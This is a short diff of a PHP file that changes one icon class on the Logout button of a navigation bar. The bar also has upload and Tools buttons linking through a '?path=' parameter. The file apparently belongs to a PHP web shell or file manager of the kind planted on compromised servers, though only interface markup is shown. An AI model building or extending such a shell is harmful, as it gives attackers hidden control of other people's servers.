@@ -508,7 +508,7 @@ echo '<button type="button" onclick=location.href="?path='.$serlok.'&'.net("uplo
 
 <button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("tool").'=opet"><i class="fa fa-wrench" style="color:#A7DBDF;"></i> Tools</button>
 
-<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("logout").'=opet"><i class="fa fa-sign-out" style="color:#A7DBDF;"></i> Logout</button>
+<button type="button" class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("logout").'=opet"><i class="fa-sign-out" style="color:#A7DBDF;"></i> Logout</button>
 
 </td></tr></div>
 </div></div></td></table></table><br>';
